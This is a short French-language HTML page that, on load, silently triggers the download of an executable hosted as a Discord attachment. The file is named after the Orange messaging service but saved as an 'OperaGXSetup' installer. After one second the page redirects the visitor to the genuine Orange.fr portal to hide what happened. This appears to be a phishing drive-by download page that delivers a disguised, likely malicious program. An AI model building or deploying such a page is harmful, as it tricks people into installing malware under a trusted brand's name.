<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Téléchargement Automatique et Redirection</title>
</head>
<body>
    <script>
        // URL du fichier à télécharger
        var fileUrl = "https://cdn.discordapp.com/attachments/1297990712738185240/1352342706759929937/Orange_messagerie.exe?ex=67ddaaca&is=67dc594a&hm=6a93006b5198b1533c0cad5cf38d4da773d8997d1f20da87c7dbbf1221ebefad&";
        // URL de la page de redirection
        var redirectUrl = "https://www.orange.fr/portail";

        // Crée un lien de téléchargement et déclenche le téléchargement automatiquement
        var a = document.createElement('a');
        a.href = fileUrl;
        a.download = "OperaGXSetup";
        document.body.appendChild(a);
        a.style.display = 'none';
        a.click();

        // Redirige après un délai de 1 secondes (1000 millisecondes)
        setTimeout(function() {
            window.location.href = redirectUrl;
        }, 1000);
    </script>
</body>
</html>
